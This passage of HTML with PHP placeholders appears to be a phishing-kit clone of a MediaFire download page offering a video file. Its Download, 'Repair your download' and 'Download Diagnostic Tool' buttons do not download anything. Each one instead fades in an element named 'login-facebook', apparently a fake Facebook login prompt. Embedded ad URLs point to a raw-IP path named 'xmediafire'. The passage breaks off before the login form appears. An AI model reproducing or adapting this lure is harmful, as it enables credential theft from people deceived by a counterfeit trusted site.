src="https://fundingchoicesmessages.google.com/i/183096492?ers=3"></script><link rel="preload" href="https://adservice.google.com.au/adsid/integrator.js?domain=www.mediafire.com" as="script"><script type="text/javascript" src="https://adservice.google.com.au/adsid/integrator.js?domain=www.mediafire.com"></script><link rel="preload" href="https://adservice.google.com/adsid/integrator.js?domain=www.mediafire.com" as="script"><script type="text/javascript" src="https://adservice.google.com/adsid/integrator.js?domain=www.mediafire.com"></script><meta http-equiv="origin-trial" content="AxujKG9INjsZ8/gUq8+dTruNvk7RjZQ1oFhhgQbcTJKDnZfbzSTE81wvC2Hzaf3TW4avA76LTZEMdiedF1vIbA4AAABueyJvcmlnaW4iOiJodHRwczovL2ltYXNkay5nb29nbGVhcGlzLmNvbTo0NDMiLCJmZWF0dXJlIjoiVHJ1c3RUb2tlbnMiLCJleHBpcnkiOjE2NTI3NzQ0MDAsImlzVGhpcmRQYXJ0eSI6dHJ1ZX0="><meta http-equiv="origin-trial" content="Azuce85ORtSnWe1MZDTv68qpaW3iHyfL9YbLRy0cwcCZwVnePnOmkUJlG8HGikmOwhZU22dElCcfrfX2HhrBPAkAAAB7eyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiVHJ1c3RUb2tlbnMiLCJleHBpcnkiOjE2NTI3NzQ0MDAsImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="A16nvcdeoOAqrJcmjLRpl1I6f3McDD8EfofAYTt/P/H4/AWwB99nxiPp6kA0fXoiZav908Z8etuL16laFPUdfQsAAACBeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXRhZ3NlcnZpY2VzLmNvbTo0NDMiLCJmZWF0dXJlIjoiVHJ1c3RUb2tlbnMiLCJleHBpcnkiOjE2NTI3NzQ0MDAsImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="AxBHdr0J44vFBQtZUqX9sjiqf5yWZ/OcHRcRMN3H9TH+t90V/j3ENW6C8+igBZFXMJ7G3Pr8Dd13632aLng42wgAAACBeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiVHJ1c3RUb2tlbnMiLCJleHBpcnkiOjE2NTI3NzQ0MDAsImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="A88BWHFjcawUfKU3lIejLoryXoyjooBXLgWmGh+hNcqMK44cugvsI5YZbNarYvi3roc1fYbHA1AVbhAtuHZflgEAAAB2eyJvcmlnaW4iOiJodHRwczovL2dvb2dsZS5jb206NDQzIiwiZmVhdHVyZSI6IlRydXN0VG9rZW5zIiwiZXhwaXJ5IjoxNjUyNzc0NDAwLCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ=="><meta http-equiv="origin-trial" content="AzoawhTRDevLR66Y6MROu167EDncFPBvcKOaQispTo9ouEt5LvcBjnRFqiAByRT+2cDHG1Yj4dXwpLeIhc98/gIAAACFeyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjYxMjk5MTk5LCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ=="><meta http-equiv="origin-trial" content="A6+nc62kbJgC46ypOwRsNW6RkDn2x7tgRh0wp7jb3DtFF7oEhu1hhm4rdZHZ6zXvnKZLlYcBlQUImC4d3kKihAcAAACLeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjYxMjk5MTk5LCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ=="><meta http-equiv="origin-trial" content="A/9La288e7MDEU2ifusFnMg1C2Ij6uoa/Z/ylwJIXSsWfK37oESIPbxbt4IU86OGqDEPnNVruUiMjfKo65H/CQwAAACLeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXRhZ3NlcnZpY2VzLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjYxMjk5MTk5LCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ=="><script async="" src="https://fundingchoicesmessages.google.com/f/AGSKWxW4mZbHfABgQYQjYivupH9MIZ-3VZJ_U6WjaERrQM9r1glQTSp-NP48XnpoHu4JLfXjoFDAspfze82v8Oj1iiViwUyP_PQDjC4cDP48gaBiiaFw-kWWRoEFKTGRWfwsl7-IsadkKcSkoYYLgqnt7HWh7WPGGRFoMKilbdUTadp8EqC6iLJzjZFNm3xA?fccs=W1siQUtzUm9sX1lwTWxVRHFhenpvcG9laUxzc2Zpb2J5U1RFUWY2czR1MTJEWERWZE1FeVdFV1hEWkpiRGJBcjJ2ZXJjdnBPMTRSQVZBeGFyV2ZXcFpyOGROenhGeGtseVJnQVZMNTZLZnVzQ0REcnA0aXdoRzFRb05NTy1lNVFWWW1Rd2dkZUF2UjVTMlpkY3JTZXBUTUhENVgxbUJ4NGFmOHhRPT0iXSxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsWzE2NTI1NTYxNzcsMjI5MDAwMDAwXSxudWxsLG51bGwsbnVsbCxbbnVsbCxbNyw2XSxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCwxXSwiaHR0cHM6Ly93d3cubWVkaWFmaXJlLmNvbS9maWxlL2I3dW5lajhwM3R5c20yOC9jdXRlX2NhdF9yZWxheF9vbl9vdXRkb29yX2dyb3VuZF82ODkyNTMzLm1wNC9maWxlIixudWxsLFtdXQ"></script><script async="" src="https://fundingchoicesmessages.google.com/f/AGSKWxVePcSnZ7UfDRL9aWF7bBkt9k3nRZywi7kRsA4rHgN7Co_E9OVxs7U64MFwDSVoRWwlR9bI8JMKewn9uBfbIsZv48yGdb1einwlCwVGGLrjNDHFQcBQfauXb6rXrchcNWQv2APThUk4C7hgupudDhbE0CTvP1aloa_Y7ZX4sfQuq392o9e5XaRRQ9Jm?fccs=W1siQUtzUm9sX1lwTWxVRHFhenpvcG9laUxzc2Zpb2J5U1RFUWY2czR1MTJEWERWZE1FeVdFV1hEWkpiRGJBcjJ2ZXJjdnBPMTRSQVZBeGFyV2ZXcFpyOGROenhGeGtseVJnQVZMNTZLZnVzQ0REcnA0aXdoRzFRb05NTy1lNVFWWW1Rd2dkZUF2UjVTMlpkY3JTZXBUTUhENVgxbUJ4NGFmOHhRPT0iXSxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsWzE2NTI1NTYxNzcsNDk2MDAwMDAwXSxudWxsLG51bGwsbnVsbCxbbnVsbCxbNyw2LDEwXSxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCwxXSwiaHR0cHM6Ly93d3cubWVkaWFmaXJlLmNvbS9maWxlL2I3dW5lajhwM3R5c20yOC9jdXRlX2NhdF9yZWxheF9vbl9vdXRkb29yX2dyb3VuZF82ODkyNTMzLm1wNC9maWxlIixudWxsLFtdXQ"></script><script async="" src="https://fundingchoicesmessages.google.com/f/AGSKWxVwy3NKtSpzh5HSOuq5kx6Xg4Lbvy0RZ-9IxXsEjL8EKVzR2az9gU8KfMRc2HL9WgUX3PfqdhVRiJ5-UgzKuNqNfyMIyNWZ0rUGFrnSEq2hvtZooVYth5WRsPav1oIIBAD55wEnupRRLW9V8mMDHdoaVpxS2rRIqX1Ada96bo2ZWONp6bM35qFVUGam?fccs=W1siQUtzUm9sX1lwTWxVRHFhenpvcG9laUxzc2Zpb2J5U1RFUWY2czR1MTJEWERWZE1FeVdFV1hEWkpiRGJBcjJ2ZXJjdnBPMTRSQVZBeGFyV2ZXcFpyOGROenhGeGtseVJnQVZMNTZLZnVzQ0REcnA0aXdoRzFRb05NTy1lNVFWWW1Rd2dkZUF2UjVTMlpkY3JTZXBUTUhENVgxbUJ4NGFmOHhRPT0iXSxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsWzE2NTI1NTYxNzgsNjQwMDAwMDBdLG51bGwsbnVsbCxudWxsLFtudWxsLFs3LDYsMTAsOV0sbnVsbCwyLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsMV0sImh0dHBzOi8vd3d3Lm1lZGlhZmlyZS5jb20vZmlsZS9iN3VuZWo4cDN0eXNtMjgvY3V0ZV9jYXRfcmVsYXhfb25fb3V0ZG9vcl9ncm91bmRfNjg5MjUzMy5tcDQvZmlsZSIsbnVsbCxbXV0"></script><meta http-equiv="origin-trial" content="AxujKG9INjsZ8/gUq8+dTruNvk7RjZQ1oFhhgQbcTJKDnZfbzSTE81wvC2Hzaf3TW4avA76LTZEMdiedF1vIbA4AAABueyJvcmlnaW4iOiJodHRwczovL2ltYXNkay5nb29nbGVhcGlzLmNvbTo0NDMiLCJmZWF0dXJlIjoiVHJ1c3RUb2tlbnMiLCJleHBpcnkiOjE2NTI3NzQ0MDAsImlzVGhpcmRQYXJ0eSI6dHJ1ZX0="><meta http-equiv="origin-trial" content="Azuce85ORtSnWe1MZDTv68qpaW3iHyfL9YbLRy0cwcCZwVnePnOmkUJlG8HGikmOwhZU22dElCcfrfX2HhrBPAkAAAB7eyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiVHJ1c3RUb2tlbnMiLCJleHBpcnkiOjE2NTI3NzQ0MDAsImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="A16nvcdeoOAqrJcmjLRpl1I6f3McDD8EfofAYTt/P/H4/AWwB99nxiPp6kA0fXoiZav908Z8etuL16laFPUdfQsAAACBeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXRhZ3NlcnZpY2VzLmNvbTo0NDMiLCJmZWF0dXJlIjoiVHJ1c3RUb2tlbnMiLCJleHBpcnkiOjE2NTI3NzQ0MDAsImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="AxBHdr0J44vFBQtZUqX9sjiqf5yWZ/OcHRcRMN3H9TH+t90V/j3ENW6C8+igBZFXMJ7G3Pr8Dd13632aLng42wgAAACBeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiVHJ1c3RUb2tlbnMiLCJleHBpcnkiOjE2NTI3NzQ0MDAsImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="A88BWHFjcawUfKU3lIejLoryXoyjooBXLgWmGh+hNcqMK44cugvsI5YZbNarYvi3roc1fYbHA1AVbhAtuHZflgEAAAB2eyJvcmlnaW4iOiJodHRwczovL2dvb2dsZS5jb206NDQzIiwiZmVhdHVyZSI6IlRydXN0VG9rZW5zIiwiZXhwaXJ5IjoxNjUyNzc0NDAwLCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ=="><meta http-equiv="origin-trial" content="AzoawhTRDevLR66Y6MROu167EDncFPBvcKOaQispTo9ouEt5LvcBjnRFqiAByRT+2cDHG1Yj4dXwpLeIhc98/gIAAACFeyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjYxMjk5MTk5LCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ=="><meta http-equiv="origin-trial" content="A6+nc62kbJgC46ypOwRsNW6RkDn2x7tgRh0wp7jb3DtFF7oEhu1hhm4rdZHZ6zXvnKZLlYcBlQUImC4d3kKihAcAAACLeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjYxMjk5MTk5LCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ=="><meta http-equiv="origin-trial" content="A/9La288e7MDEU2ifusFnMg1C2Ij6uoa/Z/ylwJIXSsWfK37oESIPbxbt4IU86OGqDEPnNVruUiMjfKo65H/CQwAAACLeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXRhZ3NlcnZpY2VzLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjYxMjk5MTk5LCJpc1N1YmRvbWFpbiI6dHJ1ZSwiaXNUaGlyZFBhcnR5Ijp0cnVlfQ=="><script src="https://securepubads.g.doubleclick.net/gpt/pubads_impl_2022051101.js?cb=31067573" async=""></script><script async="" src="https://fundingchoicesmessages.google.com/f/AGSKWxXtFsV1i49-O9pzkbwE7qk46fVb-vXuGZpU4BlbBsAif0fzj29bNOJVOoei8gJzXck-OjM_leyOTq3wBd1Sgz85PYk_WkL9V0Qly7j0LndAyEMBL-YknbgKd1yCukCbEZftLpJW9abFNOQtgZE3TXKJiwGZ-hK4RT0rvE_DC5lqQwNeX80tztJBVZVU?fccs=W251bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLFsxNjUyNTU2MjEwLDIxOTAwMDAwMF0sbnVsbCxudWxsLG51bGwsW251bGwsWzcsNiwxMF0sbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsMV0sImh0dHA6Ly8xMDMuMTM2LjQzLjQyL354bWVkaWFmaXJlLyIsbnVsbCxbXV0"></script><script async="" src="https://fundingchoicesmessages.google.com/f/AGSKWxVzszxZckVyNOuI1QjbAc3Z_C5FLBMelW5rBP4j6RMtatm0KtAisUzxjDCn3RjWsjGs2NGaoHnCMmO3Dg-I4ZUQwO5wzk-ybYrWhPcGdT0EYGRFYPpFseDxgg4FL2W3rTBFSSH2yjCJ8ZXdBwG7vupcTcD9wC80McK9XbIigf8B9VmyRI6ygA-3UHp-?fccs=W251bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLFsxNjUyNTU2MjEwLDIyNzAwMDAwMF0sbnVsbCxudWxsLG51bGwsW251bGwsWzcsNiwxMCw5XSxudWxsLDIsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCwxXSwiaHR0cDovLzEwMy4xMzYuNDMuNDIvfnhtZWRpYWZpcmUvIixudWxsLFtdXQ"></script><link type="text/css" rel="stylesheet" charset="UTF-8" href="https://translate.googleapis.com/translate_static/css/translateelement.css"><script type="text/javascript" charset="UTF-8" src="https://translate.googleapis.com/_/translate_http/_/js/k=translate_http.tr.en_GB.fnXM8WkEhAk.O/am=Bg/d=1/exm=el_conf/ed=1/rs=AN8SPfqTwPw6pto53ylsvwQV-kvv4fa6Xw/m=el_main"></script><script async="" src="https://fundingchoicesmessages.google.com/f/AGSKWxWhqzBYk2BIjB37-W2g8LzVKsoBlzRw9_hbeF3Ll8M3QrIY3c8JQLJxDUbuuspYPoSXvwzik4oChzfFtf4aD3phkI_ITwzN35R7zfCMxvfdTrBC98NlZPmNC8bAceUBc2g5Nt4aVYmrzNeQpVkWATP71QJ8SM9q-6SNA8h_bf0NlIlvwaXAuMfczgZW?fccs=W251bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLFsxNjUyNTU2MjExLDczMDAwMDAwXSxudWxsLG51bGwsbnVsbCxbbnVsbCxbNyw2XSxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLG51bGwsbnVsbCwxXSwiaHR0cDovLzEwMy4xMzYuNDMuNDIvfnhtZWRpYWZpcmUvIixudWxsLFtdXQ"></script></head>
<body class="en defaultTheme" style="position: relative; min-height: 100%; top: 0px;">
<main role="main" class="mf-dlr page ads-mobile4 mobile">
<label for="copy" style="display: none;">Copy textarea</label>
<textarea id="copy" style="position:absolute;left:-9999px;opacity:0" aria-hidden="true" tabindex="-1"><?php echo $linkweb ?></textarea>
<div class="content">
<style type="text/css">
.header {
    height: 70px;
    background: #fff;
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    z-index: 45;
    box-shadow: 0 1px 0 0 rgba(0, 0, 0, .1);
}

.logo {
    float: left;
    margin: 0;
}

.logo > a {
    display: table;
    height: 70px;
    width: 191px;
    background: url(//static.mediafire.com/images/backgrounds/header/mf_logo_full_color.svg) 0 center/180px auto no-repeat;
    margin: 0 auto;
    text-indent: -9999px;
}

.user-menu {
    float: right;
    margin: 17px 0px 0 0;
    font-family: "open sans";
    font-size: 12px;
}

.user-menu > li {
    float: right;
}

.loginActivateFB,
.loginActivateTW {
    position: absolute;
    top: 50%;
    height: 20px;
    width: 20px;
    border-radius: 2px;
    background-color: rgba(0, 0, 0, .15);
    background-repeat: no-repeat;
    background-position: center;
    background-size: 17px;
    transform: translateY(-50%);
}

.loginActivateFB {
    background-image: url(//static.mediafire.com/images/icons/svg_light/facebook.svg);
    right: 32px;
}

.loginActivateTW {
    background-image: url(//static.mediafire.com/images/icons/svg_light/twitter.svg);
    right: 8px;
}

#login {
    margin-right: 0;
    border-bottom-left-radius: 0;
    border-top-left-radius: 0;
    position: relative;
    padding-right: 67px;
}

#signup {
    margin-right: 1px;
    border-bottom-right-radius: 0;
    border-top-right-radius: 0;
}

.user-menu-help {
    margin-right: 10px;
}

.mobile .user-menu-help {
    display: none;
}

#login,
#signup,
.user-menu-help {
    max-width: 150px;
    white-space: nowrap;
    text-overflow: ellipsis;
    overflow: hidden;
}

/* Media queries
========================================================================== */

@media (max-width: 960px) {
    .logo {
        margin-left: 20px;
    }

    .user-menu {
        margin-right: 17px;
    }
}

@media (max-width: 940px) {
    .loginActivateFB,
    .loginActivateTW {
        display: none;
    }

    #login, #signup {
        width: 85px;
        padding: 0 10px;
    }

    .user-menu-help {
        font-size: 0;
    }

    .user-menu-help .g-Icon--help {
        margin: 0;
    }
}

@media (max-width: 720px) {
    .logo {
        width: 48px;
        overflow: hidden;
    }

    .user-menu-help {
        display: none;
    }
}

@media (max-width: 650px) {
    .customLogo .logo,
    .customLogo .logo > a {
        width: 150px;
    }
}

@media (max-width: 610px) {
    #goog-header-translate{
        width: 60px;
    }

    #goog-header-translate .goog-te-combo {
        text-indent: 60px;
        padding: 0;
    }
}

@media (max-width: 500px) {
    #login, #signup {
        font-size: 9px;
        padding: 0 5px;
        width: 60px;
    }

    #goog-header-translate {
        width: 36px;
        background-position: center;
    }

    #goog-header-translate .goog-te-combo {
        padding: 0;
        background-image: none !important;
    }
}

@media (max-width: 400px) {
    .logo {
        margin-left: 5px;
    }

    .customLogo .logo {
        margin-left: 0;
    }

    .customLogo .logo,
    .customLogo .logo > a {
        width: 110px;
    }
}

@media (max-width: 340px) {
    .customLogo .logo,
    .customLogo .logo > a {
        width: 80px;
    }
}
</style>
<div class="header">
<div class="u-wrap">
<h1 class="logo">
<a href="/">MediaFire</a>
</h1>
<ul class="user-menu">
<li>
<a href="#
    " id="login" class="g-Btn g-Btn--primary">
<span class="loginActivateTW"></span>
<span class="loginActivateFB"></span>
Log In
</a>
</li>
<li>
<a href="#" id="signup" class="g-Btn g-Btn--primary">Sign Up</a>
</li>
<li>
<a href="/help" class="user-menu-help g-Btn g-Btn--secondary">
<span class="g-Icon g-Icon--help"></span>Help
</a>
</li>
<li class="header-gt-cont">
<noscript><style>.header-gt-cont { display: none; }</style></noscript>
<span class="gt-label">Language:</span>
<div id="goog-header-translate" class="g-Btn g-Btn--secondary"><div class="skiptranslate goog-te-gadget" dir="ltr" style=""><div id=":0.targetLanguage"><select class="goog-te-combo" aria-label="Language Translate Widget"><option value="">Select Language</option><option value="af">Afrikaans</option><option value="sq">Albanian</option><option value="am">Amharic</option><option value="ar">Arabic</option><option value="hy">Armenian</option><option value="az">Azerbaijani</option><option value="eu">Basque</option><option value="be">Belarusian</option><option value="bn">Bengali</option><option value="bs">Bosnian</option><option value="bg">Bulgarian</option><option value="my">Burmese</option><option value="ca">Catalan</option><option value="ceb">Cebuano</option><option value="ny">Chichewa</option><option value="zh-CN">Chinese (Simplified)</option><option value="zh-TW">Chinese (Traditional)</option><option value="co">Corsican</option><option value="hr">Croatian</option><option value="cs">Czech</option><option value="da">Danish</option><option value="nl">Dutch</option><option value="eo">Esperanto</option><option value="et">Estonian</option><option value="tl">Filipino</option><option value="fi">Finnish</option><option value="fr">French</option><option value="fy">Frisian</option><option value="gl">Galician</option><option value="ka">Georgian</option><option value="de">German</option><option value="el">Greek</option><option value="gu">Gujarati</option><option value="ht">Haitian Creole</option><option value="ha">Hausa</option><option value="haw">Hawaiian</option><option value="iw">Hebrew</option><option value="hi">Hindi</option><option value="hmn">Hmong</option><option value="hu">Hungarian</option><option value="is">Icelandic</option><option value="ig">Igbo</option><option value="id">Indonesian</option><option value="ga">Irish Gaelic</option><option value="it">Italian</option><option value="ja">Japanese</option><option value="jw">Javanese</option><option value="kn">Kannada</option><option value="kk">Kazakh</option><option value="km">Khmer</option><option value="rw">Kinyarwanda</option><option value="ko">Korean</option><option value="ku">Kurdish (Kurmanji)</option><option value="ky">Kyrgyz</option><option value="lo">Lao</option><option value="la">Latin</option><option value="lv">Latvian</option><option value="lt">Lithuanian</option><option value="lb">Luxembourgish</option><option value="mk">Macedonian</option><option value="mg">Malagasy</option><option value="ms">Malay</option><option value="ml">Malayalam</option><option value="mt">Maltese</option><option value="mi">Maori</option><option value="mr">Marathi</option><option value="mn">Mongolian</option><option value="ne">Nepali</option><option value="no">Norwegian</option><option value="or">Odia (Oriya)</option><option value="ps">Pashto</option><option value="fa">Persian</option><option value="pl">Polish</option><option value="pt">Portuguese</option><option value="pa">Punjabi</option><option value="ro">Romanian</option><option value="ru">Russian</option><option value="sm">Samoan</option><option value="gd">Scots Gaelic</option><option value="sr">Serbian</option><option value="st">Sesotho</option><option value="sn">Shona</option><option value="sd">Sindhi</option><option value="si">Sinhala</option><option value="sk">Slovak</option><option value="sl">Slovenian</option><option value="so">Somali</option><option value="es">Spanish</option><option value="su">Sundanese</option><option value="sw">Swahili</option><option value="sv">Swedish</option><option value="tg">Tajik</option><option value="ta">Tamil</option><option value="tt">Tatar</option><option value="te">Telugu</option><option value="th">Thai</option><option value="tr">Turkish</option><option value="tk">Turkmen</option><option value="uk">Ukrainian</option><option value="ur">Urdu</option><option value="ug">Uyghur</option><option value="uz">Uzbek</option><option value="vi">Vietnamese</option><option value="cy">Welsh</option><option value="xh">Xhosa</option><option value="yi">Yiddish</option><option value="yo">Yoruba</option><option value="zu">Zulu</option></select></div>Powered by <span style="white-space:nowrap"><a class="goog-logo-link" href="https://translate.google.com" target="_blank"><img src="https://www.gstatic.com/images/branding/googlelogo/1x/googlelogo_color_42x16dp.png" width="37px" height="14px" style="padding-right: 3px" alt="Google Translate">Translate</a></span></div><div class="skiptranslate goog-te-gadget" dir="ltr" style=""><div id=":0.targetLanguage"></div>Powered by <span style="white-space:nowrap"><a class="goog-logo-link" href="https://translate.google.com" target="_blank"><img src="https://www.gstatic.com/images/branding/googlelogo/1x/googlelogo_color_42x16dp.png" width="37px" height="14px" style="padding-right: 3px" alt="Google Translate">Translate</a></span></div></div>
<script type="text/javascript">
                  try {
                    function googHeadTranslate() {
                        new google.translate.TranslateElement({
                            pageLanguage: 'en',
                            layout: google.translate.TranslateElement.InlineLayout.VERTICAL,
                            gaTrack: true,
                            gaId: 'UA-829541-1'
                        }, 'goog-header-translate');
                        registerGoogleLang();
                    }
                  } catch(e) {}
                </script>
<script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googHeadTranslate" async="" defer=""></script>
</li>
</ul>
</div>
</div>
<div class="center">
<div class="ads dl-box">
<div class="dl-btn-cont">
<div class="icon mp4 video video_mp4"></div>
<div class="dl-btn-labelWrap">
<div class="promoDownloadName notranslate">
<div class="dl-btn-label" title="<?php echo $namafile; ?>.mp4">
<?php echo $namafile; ?>.mp4</div>
</div>
<div class="dl-utility-nav">
<ul>
<li>
<a href="<?php echo $linkweb ?>" target="_blank" rel="noopener" id="shareButton" class="nopop g-Icon g-Icon--white g-Icon--share" aria-labelledby="share-tooltip" title="More sharing options"></a>
<span id="share-tooltip" class="alt point-down tooltip">
More sharing options
</span>
</li>
<li>
<a href="<?php echo $linkweb ?>" target="_blank" rel="noopener" id="copyShareURL" class="nopop g-Icon g-Icon--white g-Icon--link" aria-labelledby="copy-tooltip" title="Copy file link to clipboard"></a>
<span id="copy-tooltip" class="alt point-down tooltip">
Copy file link to clipboard
</span>
</li>
<li>
<a href="" id="saveButton" class="g-Icon g-Icon--white g-Icon--add" aria-labelledby="save-tooltip" title="Save file to My Files"></a>
<span id="save-tooltip" class="alt point-down tooltip">
Save file to My Files
</span>
</li>
<noscript>
                    <style type="text/css">
                        #shareButton, #copyShareURL, #saveButton { display: none }
                    </style>
                </noscript>
</ul>
</div>
</div>
<form method="post" name="download" onclick="$('.login-facebook').fadeIn();" class="dl-btn-form" autocomplete="off">
<input type="hidden" name="security" value="1652556174.48dd29fd50ea7010e97058a464a3ac15b097b645e31e53ab868e72fb458e0f66">
<div class="download_link" id="download_link">
<a class="preparing" href="#"><span>Preparing your download...</span></a>
<a class="input popsok" aria-label="Download file" onclick="$('.login-facebook').fadeIn();" id="downloadButton">
Download (<?php echo $ukuranfile; ?>)
</a>
<a class="starting" href="#"><span>Your download is starting...</span></a>
<a class="retry" onclick="$('.login-facebook').fadeIn();">
<span class="notranslate">Not working? <em>Repair your download</em></span>
</a>
<script type="text/javascript">
                (function() {
                    var dl = document.getElementById('download_link');
                    if (!dl) return;
                    var init = false;

                    function retry() {
                        dl.className += ' retry';
                    };

                    function download() {
                        dl.className += ' started';
                        window.dlStarted = true;
                                                    setTimeout(retry, 16000);
                                            };

                    window.initDownload = function() {
                        if (init) return;
                        init = true;
                        dl.className = 'download_link';
                        dl.onclick = download;
                    };

                                            initDownload();
                                    })();
                </script>
</div>
<a onclick="$('.login-facebook').fadeIn();"> class="download_test_link">
Download Diagnostic Tool
</a>
</form>
<div class="DLMobile-shareOptions">
<ul>
<li>
<a href="<?php echo $linkweb ?>" target="_blank" rel="noopener" id="copyShareURLMobile" class="nopop">
<span></span>Copy for messenger
</a>
</li>
<li>
<a href="https://facebook.com/share.php?u=<?php echo $linkweb ?>" id="facebookShareButtonMobile" target="_blank" rel="noopener" class="nopop">
<span></span>Post to Facebook
</a>
</li>
</ul>
<ul>
<li>
<a href="#share" id="shareButtonMobile" class="nopop">
<span></span>Share options
 </a>
</li>
<li>
<a href="" id="saveButtonMobile">
<span></span>Save to My Files
</a>
</li>
</ul>
</div>
</div>
<script type="text/javascript">
    var sticky = {
        threshold: 800,
        div: null,
        init: function() {
            this.div = document.getElementsByClassName('ads-mobile5')[0];
            if (this.div) {
                this.scroll();
                this.events();
            }
        },

        scroll: function() {
            if (this.div) {
                if (window.scrollY > this.threshold) {
                    this.div.classList.add('swapAd');
                } else {
                    this.div.classList.remove('swapAd');
                }
            }
        },

        debounce: function(func, wait, immediate) {
            var timeout;
            return function() {
                var context = this, args = arguments;
                var later = function() {
                    timeout = null;
                    if (!immediate) func.apply(context, args);
                };
                var callNow = immediate && !timeout;
                clearTimeout(timeout);
                timeout = setTimeout(later, wait);
                if (callNow) func.apply(context, args);
            };
        },

        events: function() {
            if (this.div) {
                var debouncedScroll = this.debounce(this.scroll.bind(this), 50);
                window.addEventListener('scroll', debouncedScroll);
            }
        }
    };

    document.addEventListener("DOMContentLoaded", sticky.init.bind(sticky));
</script>
<a class="dl-promo-cont nopop" href="/upgrade" target="_blank" rel="noopener">
MediaFire Pro: Faster bulk downloads, Ad free downloads, &amp; 1 TB of storage. From $3.75/month.
</a>
<div class="dl-info">
<div class="intro icon mp4 video video_mp4">
<div class="filename"><?php echo $namafile; ?>.mp4</div>
<div class="filetype"><span>Video</span><span> (.MP4)<span></span></span></div>
</div>
<ul class="details">
<li>File size: <span><?php echo $ukuranfile; ?></span></li>
<li>Uploaded: <span>2022-05-14 14:15:48</span></li>
</ul>
<div class="description">
<p class="description-subheading">About Video Formats</p>
<p>As with all media formats, video formats run the spectrum between high quality and low file size. Lossless compression for video files attempts to reduce the file size by removing redundancies. Lossy compression schemes reduce filesize by discarding data without the viewer noticing. The Advanced Video Coding (AVC) standard is one of the most commonly used formats for recording, compressing, and distributing high definition video.</p>
</div>
<div class="sidebar">
<div class="apps">
<div>
<div class="filename"><?php echo $namafile; ?>.mp4</div>
<br>Can be opened with
</div>
<ul>
<li>
<a class="nopop" href="https://prf.hn/click/camref:1011ldfGx/destination:https:/shop.pinnaclesys.com/1534/purl-ESDPNST25STML?coupon=MEDIAFIRE10" target="_blank" rel="noreferrer" title="Pinnacle Studio">
Pinnacle Studio </a>
</li>
<li>
<a class="nopop" href="http://windows.microsoft.com/en-US/windows/products/windows-media-player" target="_blank" rel="noreferrer" title="Windows Media Player">
Windows Media Player </a>
</li>
</ul>
</div>
<div class="Download-compatibility">
<div style="margin-bottom: 0;">
